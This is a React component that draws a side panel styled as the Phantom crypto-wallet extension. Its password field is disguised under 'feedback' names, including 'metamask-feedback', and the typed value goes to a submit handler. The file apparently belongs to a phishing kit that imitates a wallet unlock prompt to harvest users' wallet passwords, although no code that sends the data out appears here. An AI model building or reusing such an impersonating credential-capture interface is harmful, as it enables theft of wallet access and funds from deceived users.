import { XMarkIcon } from "@heroicons/react/24/outline";
import { QuestionMarkCircleIcon } from "@heroicons/react/24/solid";
import { motion } from "motion/react";
import { walletModalCopy } from "./copy";
import type { WalletModalProps } from "./types";

const Phantom = ({
  feedback,
  feedbackError,
  isDarkMode,
  onClose,
  onFeedbackChange,
  onSubmit
}: WalletModalProps) => {
  const copy = walletModalCopy.phantom;
  const shouldShowFeedbackError = Boolean(
    feedbackError && feedbackError !== copy.feedback_error
  );

  return (
    <motion.aside
      animate={{ opacity: 1, x: 0 }}
      aria-label={copy.dialog_label}
      aria-modal="true"
      className={`fixed top-0 right-0 z-[101] flex h-dvh w-[min(365px,100vw)] flex-col border-l px-px shadow-2xl ${isDarkMode ? "border-[#4a5256] bg-[#373f42] text-[#e8eaeb]" : "border-gray-200 bg-[#fffaf7] text-[#131416]"}`}
      exit={{ opacity: 0, x: "100%" }}
      initial={{ opacity: 0, x: "100%" }}
      role="dialog"
      style={{ fontFamily: "Arial, sans-serif", fontSize: "1rem" }}
      transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
    >
      <header className="flex h-[35px] shrink-0 items-center justify-between px-2">
        <div className="flex items-center gap-2">
          <img
            alt=""
            aria-hidden="true"
            className="size-5"
            height={20}
            src={copy.icon_src}
            width={20}
          />
          <h2 className="font-medium text-[14px] leading-6">{copy.title}</h2>
        </div>
        <button
          aria-label={copy.close_label}
          className={`rounded-full font-semibold ${isDarkMode ? "text-[#e8eaeb] hover:bg-white/10" : "text-gray-700 hover:bg-black/5"}`}
          onClick={onClose}
          type="button"
        >
          <XMarkIcon className="size-[18px]" strokeWidth={2} />
        </button>
      </header>
      <div className="m-1 mt-0 flex min-h-0 flex-1 flex-col overflow-hidden rounded-lg bg-black text-white">
        <div className="relative flex h-[58px] shrink-0 items-center justify-center">
          <h3 className="font-semibold text-[#b7b5b5] text-[22px] lowercase">
            {copy.subtitle}
          </h3>
          <a
            aria-label={copy.learn_more_aria_label}
            className="absolute right-3 rounded-full text-[#b7b5b5] hover:text-white"
            href={copy.learn_more_url}
            rel="noopener noreferrer"
            target="_blank"
          >
            <QuestionMarkCircleIcon className="size-5 fill-current" />
          </a>
        </div>
        <div className="flex min-h-0 flex-1 flex-col pt-0">
          <div className="relative flex size-[250px] shrink-0 items-center justify-center self-center overflow-hidden">
            <img
              alt=""
              aria-hidden="true"
              className="pointer-events-none size-[1000px] object-fill"
              height={1000}
              src={copy.background_src}
              style={{ filter: "brightness(0) invert(93.3333%)" }}
              width={1000}
            />
          </div>
          <div className="flex min-h-0 flex-1 flex-col px-5 pt-0">
            <h4 className="mb-3 text-center font-semibold text-[#eee] text-xl">
              {copy.form_title}
            </h4>
            <form className="flex min-h-0 flex-1 flex-col" onSubmit={onSubmit}>
              <input
                aria-invalid={Boolean(feedbackError)}
                aria-label={copy.feedback_label}
                autoComplete="new-password"
                className={`${feedbackError ? "mb-1 border-[#ca3542]" : "mb-[18px] border-[#242424]"} h-[50px] w-full rounded-md border bg-[#101010] px-4 text-base text-white outline-none placeholder:text-[#68717d] focus:ring-0 tracking-[0.2em] outline-none placeholder:tracking-normal`}
                name="metamask-feedback"
                onChange={(event) => onFeedbackChange(event.target.value)}
                placeholder={copy.feedback_placeholder}
                type="password"
                value={feedback}
              />
              {shouldShowFeedbackError ? (
                <p className="mb-3 text-[#ff727e] text-sm" role="alert">
                  {feedbackError}
                </p>
              ) : null}
              <div className="mt-auto pb-7">
                <button
                  className="mb-6 h-12 w-full rounded-full bg-[#a99bf2] font-semibold text-black text-lg transition-colors hover:bg-[#b9adfa] disabled:cursor-not-allowed disabled:opacity-50"
                  type="submit"
                >
                  {copy.button_txt}
                </button>
                <a
                  aria-label={copy.learn_more_aria_label}
                  className="block text-center font-semibold text-lg text-white leading-6 hover:underline"
                  href={copy.learn_more_url}
                  rel="noopener noreferrer"
                  target="_blank"
                >
                  {copy.learn_more}
                </a>
              </div>
            </form>
          </div>
        </div>
      </div>
    </motion.aside>
  );
};

export default Phantom;
